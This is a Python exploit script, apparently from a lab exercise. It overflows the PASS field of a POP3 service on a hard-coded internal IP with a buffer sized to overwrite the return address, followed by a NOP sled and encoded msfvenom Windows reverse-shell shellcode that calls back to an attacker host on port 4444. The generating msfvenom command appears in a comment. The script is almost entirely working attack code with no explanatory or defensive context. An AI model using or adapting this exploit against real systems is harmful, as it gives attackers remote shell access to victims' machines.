import socket

ip = '10.0.0.209'
port = 110

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.7 LPORT=4444 EXITFUNC=thread -f c -b "\x00\x0a\x0d" -e "x86/shikata_ga_nai"
shellcode = ("\xbd\xa1\x25\x75\xf1\xd9\xee\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x6b\x12\x03\x6b\x12\x83\x4a\xd9\x97\x04\x70\xca\xda"
"\xe7\x88\x0b\xbb\x6e\x6d\x3a\xfb\x15\xe6\x6d\xcb\x5e\xaa\x81"
"\xa0\x33\x5e\x11\xc4\x9b\x51\x92\x63\xfa\x5c\x23\xdf\x3e\xff"
"\xa7\x22\x13\xdf\x96\xec\x66\x1e\xde\x11\x8a\x72\xb7\x5e\x39"
"\x62\xbc\x2b\x82\x09\x8e\xba\x82\xee\x47\xbc\xa3\xa1\xdc\xe7"
"\x63\x40\x30\x9c\x2d\x5a\x55\x99\xe4\xd1\xad\x55\xf7\x33\xfc"
"\x96\x54\x7a\x30\x65\xa4\xbb\xf7\x96\xd3\xb5\x0b\x2a\xe4\x02"
"\x71\xf0\x61\x90\xd1\x73\xd1\x7c\xe3\x50\x84\xf7\xef\x1d\xc2"
"\x5f\xec\xa0\x07\xd4\x08\x28\xa6\x3a\x99\x6a\x8d\x9e\xc1\x29"
"\xac\x87\xaf\x9c\xd1\xd7\x0f\x40\x74\x9c\xa2\x95\x05\xff\xaa"
"\x5a\x24\xff\x2a\xf5\x3f\x8c\x18\x5a\x94\x1a\x11\x13\x32\xdd"
"\x56\x0e\x82\x71\xa9\xb1\xf3\x58\x6e\xe5\xa3\xf2\x47\x86\x2f"
"\x02\x67\x53\xff\x52\xc7\x0c\x40\x02\xa7\xfc\x28\x48\x28\x22"
"\x48\x73\xe2\x4b\xe3\x8e\x65\x7e\xf4\x90\x72\x16\xf6\x90\x6d"
"\xba\x7f\x76\xe7\x52\xd6\x21\x90\xcb\x73\xb9\x01\x13\xae\xc4"
"\x02\x9f\x5d\x39\xcc\x68\x2b\x29\xb9\x98\x66\x13\x6c\xa6\x5c"
"\x3b\xf2\x35\x3b\xbb\x7d\x26\x94\xec\x2a\x98\xed\x78\xc7\x83"
"\x47\x9e\x1a\x55\xaf\x1a\xc1\xa6\x2e\xa3\x84\x93\x14\xb3\x50"
"\x1b\x11\xe7\x0c\x4a\xcf\x51\xeb\x24\xa1\x0b\xa5\x9b\x6b\xdb"
"\x30\xd0\xab\x9d\x3c\x3d\x5a\x41\x8c\xe8\x1b\x7e\x21\x7d\xac"
"\x07\x5f\x1d\x53\xd2\xdb\x3d\xb6\xf6\x11\xd6\x6f\x93\x9b\xbb"
"\x8f\x4e\xdf\xc5\x13\x7a\xa0\x31\x0b\x0f\xa5\x7e\x8b\xfc\xd7"
"\xef\x7e\x02\x4b\x0f\xab")

buffer = 'A' * 2606 + '\x8f\x35\x4a\x5f' + '\x90' * 16 + shellcode + 'C' * (3500 - 2606 - 4 - 16 - len(shellcode)) 

try:
	print('[*] Creating Connection')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip,port))
	s.recv(1024)

	print('[*] Sending user name')
	s.send('USER doink\r\n')
	s.recv(1024)

	print('[*] Sending payload')
	s.send('PASS ' + buffer + '\r\n')
	s.recv(1024)

	s.close()

except KeyboardInterrupt:
	print('\n[*] Stopping')

except:
	print('[-] There was an unexpected error')
